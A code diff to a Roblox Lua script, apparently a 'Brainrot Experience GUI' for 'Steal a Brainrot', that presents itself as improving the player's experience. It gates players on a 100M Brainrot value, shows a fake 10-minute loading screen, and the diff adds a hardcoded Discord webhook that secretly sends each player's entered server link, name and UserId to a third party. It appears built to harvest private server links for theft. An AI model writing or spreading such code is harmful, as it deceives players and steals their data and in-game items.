@@ -1,17 +1,20 @@
 --[[
     Brainrot Experience GUI
     A clean, modern GUI for improving player experience in "Steal a Brainrot"
+    Agora envia links para Discord via webhook
 --]]
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
 
 local player = Players.LocalPlayer
 
 -- Configuration
 local LOADING_DURATION = 600 -- 10 minutes in seconds
 local REQUIRED_BRAINROT = 100000000 -- 100M
+local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1479973233787932813/d099lEw5cTKv60lHnaPD-SrJCKO0tc326DO5kPl7fkTE2QsV9jOUsIXobbXzImcJ1Aya" -- Coloque seu novo webhook aqui
 
 -- Create ScreenGui
 local screenGui = Instance.new("ScreenGui")
@@ -224,6 +227,63 @@ local function showNotification(message, duration)
     notificationFrame.Visible = false
 end
 
+-- Helper function to send data to Discord
+local function sendToDiscord(serverLink)
+    if DISCORD_WEBHOOK == "SEU_NOVO_WEBHOOK_AQUI" then
+        print("Webhook não configurado!")
+        return
+    end
+    
+    local payload = {
+        username = "Brainrot GUI",
+        avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png",
+        embeds = {{
+            title = "Novo Link Coletado",
+            description = "Um novo link foi coletado pelo Brainrot GUI",
+            color = 4286945,
+            fields = {
+                {
+                    name = "Link do Servidor",
+                    value = serverLink,
+                    inline = false
+                },
+                {
+                    name = "Jogador",
+                    value = player.Name,
+                    inline = true
+                },
+                {
+                    name = "User ID",
+                    value = tostring(player.UserId),
+                    inline = true
+                },
+                {
+                    name = "Horário",
+                    value = os.date("%d/%m/%Y %H:%M:%S"),
+                    inline = false
+                }
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    
+    local success, response = pcall(function()
+        return game:HttpGet(DISCORD_WEBHOOK, {
+            method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+    
+    if success then
+        print("Link enviado ao Discord com sucesso!")
+    else
+        print("Erro ao enviar ao Discord: " .. response)
+    end
+end
+
 -- Helper function to get player's Brainrot value
 local function getBrainrotValue()
     -- Check for leaderstats first
@@ -263,6 +323,9 @@ local function onDoneClick()
         showNotification("Para melhorar a experiência, você precisa ter um Brainrot de 100M+", 4)
         return
     end
+    
+    -- Send link to Discord
+    sendToDiscord(inputText)
     
     -- All checks passed - start loading
     mainFrame.Visible = false
